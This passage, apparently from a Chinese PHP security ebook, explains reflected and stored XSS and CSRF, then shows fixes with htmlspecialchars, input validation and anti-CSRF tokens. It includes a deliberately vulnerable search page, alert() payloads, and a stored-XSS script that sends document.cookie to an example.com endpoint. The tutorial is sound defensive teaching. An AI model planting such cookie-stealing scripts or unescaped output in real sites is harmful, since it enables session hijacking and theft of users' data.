
# XSS 与 CSRF 攻击防范指南

## 反射型 XSS 攻击示例

以下是一个简单的 PHP 搜索页面示例：

```html
<!DOCTYPE html>  
<html lang="en">  
<head>  
    <meta charset="UTF-8"> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>Research results</title>  
</head>  
<body>  
    <h2>Search results</h2>  
    <?php  
    // 检索表单中输入的搜索词  
    $query = $_POST['query'];  
    // 显示结果  
    echo "<p>Results for search: <strong>$query</strong></p>";  
    ?>  
</body>  
</html>
```

当您通过执行 `form_search.php` 文件使用搜索表单，并在搜索字段中输入例如 "Maximilien Lambert" 后提交表单时，您将获得类似如下的结果：

![Image](img/image-167.png)

但是，如果用户输入 JavaScript 代码，例如 `<script>alert('XSS reflected!')</script>`，而网站在将搜索数据显示在页面上之前没有执行适当的验证或转义，恶意 JavaScript 脚本将在用户执行搜索时在其浏览器中执行，显示一个包含消息 "XSS reflected!" 的对话框。

![Image](img/image-168.png)

### 反射型 XSS 修复方案

为了修复此示例中的 XSS 漏洞，我们需要在将输入数据显示在结果页面之前对其进行清理。具体方法如下：

**输入数据清理：** 在结果页面中使用 `$query` 变量之前，我们需要通过移除任何潜在的恶意 HTML 或 JavaScript 代码来清理数据。我们可以通过使用 `htmlspecialchars()` 函数对特殊字符进行编码来实现这一点。

以下是修复 XSS 漏洞的修改后代码：

```html
<!DOCTYPE html>  
<html lang="en">  
<head>  
    <meta charset="UTF-8"> 
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>Research results</title>  
</head>  
<body>  
    <h2>Search results</h2>  
    <?php  
    // 检索表单中输入的搜索词  
    $query = htmlspecialchars($_POST['query']);  
    // 显示结果  
    echo "<p>Results for search: <strong>$query</strong></p>";  
    ?>  
</body>  
</html>
```

通过应用此修改，用户输入的搜索词将在结果页面显示前得到适当的清理，通过防止恶意脚本在用户浏览器中执行，从而防范 XSS 攻击。

实际上，`htmlspecialchars()` 是一个 PHP 函数，用于将某些特殊字符转换为等效的 HTML 实体。它将 `<`、`>`、`&`、`"` 和 `'` 等字符替换为其 HTML 等效项（`&lt;`、`&gt;`、`&amp;`、`&quot;`、`&#39;`）。这意味着如果用户输入类似 `<script>alert('XSS!');</script>` 的内容，`htmlspecialchars` 函数会将 `<` 和 `>` 标签转换为 HTML 实体（`&lt;` 和 `&gt;`），从而防止脚本标签在浏览器中执行。

## XSS Stored（存储型/持久型）

存储型 XSS，也称为持久型 XSS，危害性更大，因为恶意脚本存储在服务器上（例如数据库中），随后会显示给访问受影响页面的每一位用户。当 Web 应用程序存储了不安全的用户提供的数据，然后在未经适当转义或过滤的情况下将其显示在网页上时，就会发生存储型 XSS。这允许攻击者将恶意代码（如 JavaScript 脚本）注入网页，从而危害访问该页面的用户的安全。

### 存储型 XSS 攻击示例

设想一个在线论坛，用户可以在不同主题下发布评论。网站将这些评论存储在数据库中，然后在相应页面上显示它们。如果 Web 应用程序在显示评论前未执行适当的验证或转义，攻击者就可能提交包含恶意 JavaScript 代码的评论。

例如，攻击者可能提交包含以下代码的评论：

```
<script>
  fetch('https://www.example.com/my_cookies.php?cookie=' + document.cookie);
</script>
```

当该评论在网页上显示时，恶意 JavaScript 代码会在每位查看该页面的用户的浏览器中执行。在本例中，JavaScript 代码将用户的 Cookie 发送到攻击者控制的网站，从而泄露用户信息的机密性。

### 存储型 XSS 防范

要防范 `stored XSS` 攻击，实施适当的安全实践至关重要，其中包括：表单输入验证和输出转义：

#### 输入验证

在将用户提供的数据存入数据库前，始终对其进行验证和过滤。这可能包括检查预期的数据格式（例如电子邮件地址），以及使用白名单仅允许特定值。

假设我们在网站上有一个注册表单，用户可以提交评论。为了验证用户输入，我们可以使用 PHP 内置验证函数（如 `filter_var()`）来检查电子邮件地址格式是否正确。

##### PHP 邮箱验证示例

```
$email = $_POST['email'];

// 验证邮箱地址
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo "Invalid email address";
    // 处理错误或阻止记录保存
} else {
    // 将邮箱地址保存到数据库
}
```

#### 输出转义

在将动态数据插入 HTML 页面前，对其进行适当转义。这意味着将所有特殊字符转换为 HTML 实体，以便浏览器将其视为纯文本，而非 HTML 或 JavaScript 代码。

在我们的评论表单示例中，在网页上显示评论前，我们需要转义 `<`、`>`、`&`、`"` 等特殊字符，以防止恶意脚本执行。

如果运行以下代码，将显示一个包含文本 "XSS!" 的 JavaScript 窗口：

```
$comment = "<script>alert('XSS!');</script>";
echo "<div>$comment</div>";
```

在 PHP 中，要转义 `$comment` 变量的内容，只需按如下方式使用 `htmlspecialchars()` 函数：

```
$comment = "<script>alert('XSS!');</script>";
// 转义特殊字符
$comment_echappe = htmlspecialchars($comment);
// 在网页上显示转义后的评论
echo "<div>$comment_echappe</div>";
```

在这段代码中，`htmlspecialchars()` 函数用于转义评论中的特殊字符，这意味着 `<`、`>`、`&`、`"` 等特殊字符将被转换为 HTML 实体，从而在网页上显示时变得无害。最后，转义后的评论在网页的 `<div>` 标签内显示。

当这段代码被执行并在网页上显示时，`<script>` 标签不会被解释为要执行的 JavaScript 代码，而是作为纯文本显示在屏幕上。因此，浏览器不会显示警报对话框，而是直接显示 `<script>alert('XSS!');</script>`，这表明 `<script>` 标签及其内容（包括对 `alert()` 函数的调用）已作为纯文本显示在网页上。这证明 `htmlspecialchars()` 函数成功转义了特殊字符，防止了 JavaScript 代码作为 XSS 攻击被执行。

通过应用这些良好的安全实践，开发人员可以显著降低存储型 XSS 攻击的风险，从而保护其 Web 应用程序用户的安全和隐私。

## 跨站请求伪造 (CSRF)

跨站请求伪造 (CSRF) 是一种恶意攻击，它利用已认证用户的信任，在用户不知情的情况下执行未授权操作。该攻击利用了这样一个事实：Web 浏览器会在发送给某个站点的每个请求中自动携带认证 Cookie，即使这些请求是从另一个站点发起的。

### CSRF 攻击原理

CSRF 攻击通常通过诱导已认证用户访问包含特制链接或表单的恶意站点来实施，这些链接或表单旨在对目标站点执行特定操作。当用户访问恶意站点时，由后者生成的请求会自动发送到目标站点，并携带用户的认证信息，而用户对此次攻击毫不知情。

### 实施反 CSRF 令牌

防范 CSRF 攻击的主要措施是使用反 CSRF 令牌，也称为同步令牌或防重放令牌。这些令牌是与每个用户和每个会话关联的唯一随机值。它们在服务器端生成，并包含在发送给用户的表单或 POST 请求中。提交请求时，服务器会检查相应的反 CSRF 令牌对于该特定会话和操作是否有效。如果令牌无效或缺失，则拒绝该请求。

### 反 CSRF 令牌实现示例

下面是一个在 PHP 中生成和验证反 CSRF 令牌的简单示例：

```php
<?php

session_start();
// 生成反 CSRF 令牌
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// 在表单中包含反 CSRF 令牌
echo '<form action="csrf_processing.php" method="post">';
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';
echo '<input type="submit" value="Submit">';
echo '</form>';

// 服务端验证反 CSRF 令牌
if (isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    // 处理请求
    echo "Request processed successfully";
} else {
    // 拒绝请求
    echo "Error: invalid CSRF request.";
}

?>
```

这段 PHP 代码演示了如何使用反 CSRF 令牌来防止 Web 表单上的 CSRF 攻击。以下是代码各部分的详细解释：

**`session_start()`：** 此函数启动一个新会话或恢复现有会话。会话用于存储会话变量（如反 CSRF 令牌），这些变量可通过不同页面访问。

#### 反 CSRF 令牌生成

代码检查会话中是否已存在反 CSRF 令牌。如果不存在，则使用 `random_bytes()` 函数创建一个 32 字节的随机字符串，再通过 `bin2hex()` 将其转换为十六进制表示，从而生成一个新令牌。

#### 在表单中包含反 CSRF 令牌

随后，反 CSRF 令牌作为隐藏字段（`<input type="hidden">`）包含在 HTML 表单中。这确保了当表单提交到服务器时，令牌会随表单数据的其余部分一同提交。

#### 服务端反 CSRF 令牌验证

表单提交时，反 CSRF 令牌也会随表单数据一同提交。代码检查提交的令牌是否与会话中存储的令牌匹配。如果两个令牌匹配，则请求合法，可成功处理。否则，将显示无效 CSRF 错误。

这种反 CSRF 令牌机制确保了从表单提交的每个请求都包含唯一且有效的令牌，通过验证请求确实来自授权网站来防止 CSRF 攻击。

### 完整实现示例

为了演示 PHP 中反 CSRF 令牌的生成与验证，我们将在 `ebookphp` 目录下创建两个文件：包含表单的 `form_csrf.php` 文件，以及处理该表单提交数据的 `csrf_processing.php` 文件。以下是这两个文件的简单代码示例：

#### 文件 1：`form_csrf.php`

```php
<?php

session_start();

// 生成反 CSRF 令牌
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// 显示包含反 CSRF 令牌的表单
echo '<form action="csrf_processing.php" method="post">';
echo '<input type="text" name="name" placeholder="Name">';
echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';
echo '<input type="submit" value="Submit">';
echo '</form>';

?>
```

**结果：**

![Image](img/image-169.png)

此 PHP 代码生成一个反 CSRF 令牌，并显示一个包含该令牌的 HTML 表单。以下是逐行解释：

*   `session_start();`：启动或恢复现有会话。
*   `if (!isset($_SESSION['csrf_token'])) { ... }`：检查 `csrf_token` 键是否已存在于会话中。如果不存在，则生成一个反 CSRF 令牌。
*   `$_SESSION['csrf_token'] = bin2hex(random_bytes(32));`：使用 `random_bytes(32)` 函数获取 32 字节随机数据，再通过 `bin2hex()` 函数将这些字节转换为十六进制字符串，从而生成随机反 CSRF 令牌。
*   `echo '<form action="csrf_processing.php" method="post">';`：开始 HTML 表单标签，action 指向文件 `csrf_processing.php`，方法为 POST。
*   `echo '<input type="text" name="lastname" placeholder="Lastname">';`：显示一个用于输入姓名的文本输入字段。
*   `echo '<input type="hidden" name="csrf_token" value="' . $_SESSION['csrf_token'] . '">';`：显示反 CSRF 令牌的隐藏字段，其值为存储在会话中的令牌。
*   `echo '<input type="submit" value="Submit">';`：显示一个提交按钮以发送表单。

简而言之，此代码生成一个包含反 CSRF 令牌的表单，以在表单提交时防范 CSRF 攻击。

#### 文件 2：`csrf_processing.php`

```php
<?php

session_start();

// 反 CSRF 令牌验证
if (isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) {
    // 令牌有效时处理请求
    echo "Request processed successfully";
} else {
    // 令牌无效时拒绝请求
    echo "Error: invalid CSRF request.";
}

?>
```

此 PHP 代码验证随 `form_csrf.php` 表单提交的反 CSRF 令牌。以下是逐行解释：

*   `session_start();`：启动或恢复现有会话。
*   `if (isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_token']) { ... }`：检查随表单提交的反 CSRF 令牌（`$_POST['csrf_token']`）是否与存储在会话中的令牌（`$_SESSION['csrf_token']`）匹配。如果两个令牌匹配，则请求有效，可进行处理。
*   `echo "Request processed successfully.";`：如果令牌有效，显示请求已成功处理的消息。
*   `else { ... }`：否则，如果令牌不匹配，则该请求可能是 CSRF 攻击，予以拒绝。
*   `echo "Error: invalid CSRF request.";`：显示指示 CSRF 请求无效的错误消息。

简而言之，此代码通过在处理请求前检查随表单提交的反 CSRF 令牌的真实性来确保安全，从而防范 CSRF 攻击。如果令牌有效，请求将成功处理；否则将被拒绝。

### 测试流程

要测试此流程，请在浏览器中访问 `form_csrf.php` 并提交表单。如果反 CSRF 令牌有效，您应看到“Request processed successfully”消息。如果您尝试在没有令牌或使用无效令牌的情况下提交表单，将看到“Error: invalid CSRF request.”消息。如果您尝试直接访问 `csrf_processing.php` 文件，也将收到“Error: invalid CSRF request.”消息。

## 安全文件上传

用户文件上传是许多 Web 应用程序的常见功能。然而，如果上传的文件未得到妥善管理，这会带来潜在的安全风险。在本节中，我们将探讨与文件上传相关的风险以及保护此功能的最佳实践。
